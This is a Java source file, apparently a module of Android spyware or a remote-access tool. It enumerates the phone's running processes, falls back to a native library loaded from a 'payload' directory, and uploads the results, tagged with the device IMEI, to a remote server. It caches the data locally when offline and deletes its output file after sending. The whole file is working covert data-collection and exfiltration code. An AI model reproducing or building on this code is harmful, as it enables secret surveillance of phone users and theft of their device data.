package com.phone.data;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileReader;
import java.io.IOException;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.json.JSONArray;
import org.json.JSONObject;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.content.Context;
import android.os.Build;
import android.util.Log;

import com.main.ForegroundService;
import com.network.Network;
import com.network.SendDataToServer;
import com.utils.PrefOper;
import com.utils.Public;
import com.utils.WriteDateFile;


public class PhoneRunningApps implements Runnable{
	
	private static String SHELL_LIB_PATH = "app_payload_libs";
	private Context context;
	private static String TAG = "PhoneRunningApps";
	
	public PhoneRunningApps(Context context){
		this.context = context;
	}
	
	
	public static String getRunningAppsJava(Context context){
		JSONArray jsarrayrun=new JSONArray();
		try {
			ActivityManager am = (ActivityManager)context.getSystemService("activity");
			List<RunningAppProcessInfo> runapplist = am.getRunningAppProcesses();

			int runappcnt = 0;
			
			for (RunningAppProcessInfo runapp : runapplist) {
				/*
				runappinfo = runappinfo + "程序名称:" + runapp.processName  + "\t进程ID:" + String.valueOf(runapp.pid) + 
						"\t用户ID:" + String.valueOf(runapp.uid) + "\tLRU:" + String.valueOf(runapp.lru) + 
						"\t描述:"+ String.valueOf(runapp.describeContents()) +  "\r\n";
						*/
				
				JSONObject jsobj=new JSONObject();
    	   	  	jsobj.put("程序名称", runapp.processName);
    	   	  	jsobj.put("进程ID",String.valueOf(runapp.pid));
    	   	  	jsobj.put("用户ID", String.valueOf(runapp.uid));
    	   	  	jsobj.put("LRU", String.valueOf(runapp.lru));
    	   	  	jsobj.put("描述", String.valueOf(runapp.describeContents()));
		   	  	jsarrayrun.put(runappcnt,jsobj);
		   	  	runappcnt++;
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

		return jsarrayrun.toString();
	}
	
	public static void getRunningApps(Context context){
		try {
			boolean cpu64 = false;

            String mProcessor = getFieldFromCpuinfo("Processor");
            if (mProcessor.contains("aarch64")) {
            	cpu64 = true;
            }

			
			String value = PrefOper.getValue(context, ForegroundService.PARAMCONFIG_FileName,
					ForegroundService.SETUPMODE);
			if ( (value.equals(ForegroundService.SETUPMODE_SO) || value.equals(ForegroundService.SETUPMODE_JAR)) ||
					Build.VERSION.SDK_INT >= 14 || cpu64 == true){	//24
				
				String appprocss = getRunningAppsJava(context);
		    	if(appprocss != null && appprocss.equals("") == false ){
			    	if (Network.isNetworkConnected(context) == false) {
			    		WriteDateFile.writeDateFile(ForegroundService.LOCAL_PATH_NAME, 
			    				ForegroundService.RUNNINGAPPS_FILE_NAME, appprocss,false);
					}else{
						SendDataToServer.sendDataToServer(appprocss.getBytes(), appprocss.getBytes().length,
								Public.CMD_DATA_RUNNINGAPPS, Public.IMEI);
					}
				}
				return;
			}
			
			//AndroidRuntime: java.lang.UnsatisfiedLinkError: 
			//No implementation found for int com.phone.data.w.howareyou(java.lang.String) 
			//(tried Java_com_phone_data_w_howareyou and Java_com_phone_data_w_howareyou__Ljava_lang_String_2)

			//1 加载的路径不同：System.load(String filename) 是从作为动态库的本地文件系统中以指定的文件名加载代码文件，
			//文件名参数必须是完整的路径名且带文件后缀；
			//而 System.loadLibrary(String libname) 是加载由 libname 参数指定的系统库（系统库指的是 java.library.path，
			//可以通过 System.getProperty(String key) 方法查看 java.library.path 指向的目录内容），
			//将库名映射到实际系统库的方法取决于系统实现，
			//譬如在 Android 平台系统会自动去系统目录、应用 lib 目录下去找 libname 参数拼接了 lib 前缀的库文件。
			//2 是否自动加载库的依赖库：譬如 libA.so 和 libB.so 有依赖关系，
			//如果选择 System.load("/sdcard/path/libA.so")，即使 libB.so 也放在 /sdcard/path/ 路径下，
			//load 方法还是会因为找不到依赖的 libB.so 文件而失败，因为虚拟机在载入 libA.so 的时候发现它依赖于 libB.so，
			//那么会先去 java.library.path 下载入 libB.so，而 libB.so 并不位于 java.library.path 下，所以会报错。
			//解决的方案就是先 System.load("/sdcard/path/libB.so") 再 System.load("/sdcard/path/libA.so")，
			//但是这种方式不太靠谱，因为必须明确知道依赖关系；
			//另一种解决方案就是使用 System.loadLibrary("A")，然后把 libA.so 和 libB.so 都放在 java.library.path 下即可。

			String sofilepath = context.getFilesDir().getParent() + "/" + SHELL_LIB_PATH + "/";
			File sopathFile = new File(sofilepath);
			if (sopathFile.exists() == true) {
				Log.e(TAG, "System.load:" + sofilepath + "libRunningApps.so");
				System.load(sofilepath + "libRunningApps.so");
				
			}else{
				Log.e(TAG, "System.loadLibrary RunningApps");
				//System.load("libRunningApps.so");
				System.loadLibrary("RunningApps");
				
			}
			
			String dstfn = ForegroundService.LOCAL_PATH_NAME + ForegroundService.RUNNINGAPPS_FILE_NAME;
			int ret  = procRunningApps(dstfn);
			if (ret == 0) {
				
				File file = new File(dstfn);
				if (file.exists() ) {
//					String filename = ForegroundService.RUNNINGAPPS_FILE_NAME;
//					int filenamelen = filename.getBytes().length;
					int filesize = (int)file.length();
					//int sendsize = filesize + 4 + filenamelen + 4;
					int sendsize = filesize;
					byte[] sendbuf = new byte[sendsize];
//					byte[] bytefilenamelen = PublicFunction.intToBytes(filenamelen);
//					System.arraycopy(bytefilenamelen, 0, sendbuf, 0, 4);
//					System.arraycopy(filename.getBytes(), 0, sendbuf, 4, filenamelen);
//					byte[] bytefilesize = PublicFunction.intToBytes(filesize);
//					System.arraycopy(bytefilesize, 0, sendbuf, 4 + filenamelen, 4);
					
		    		FileInputStream fin = new FileInputStream(file);
		    		//fin.read(sendbuf,4 + filenamelen + 4,filesize);
		    		fin.read(sendbuf,0,filesize);
		    		fin.close();
		    		
		    		SendDataToServer.sendDataToServer(sendbuf,sendsize, Public.CMD_DATA_RUNNINGAPPS, Public.IMEI);
		    		WriteDateFile.writeLogFile("find runningapps file:" + file.getName() + "\r\n");
		    		file.delete();
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public void run(){
		getRunningApps(context);

	}
	
	@SuppressWarnings("resource")
	public static String getFieldFromCpuinfo(String field) throws IOException {
		BufferedReader br = null;
		try {
	        
	        br = new BufferedReader(new FileReader("/proc/cpuinfo"));
	        Pattern p = Pattern.compile(field + "\\s*:\\s*(.*)");
       
            String line;
            while ((line = br.readLine()) != null) {
                Matcher m = p.matcher(line);
                if (m.matches()) {
                    return m.group(1);
                }
            }
        } catch(Exception ex) {
        	ex.printStackTrace();
        	if(br != null){
        		br.close();
        	}
        }

        return "";
    }
	
	
	public static native int procRunningApps(String dstfn);

}


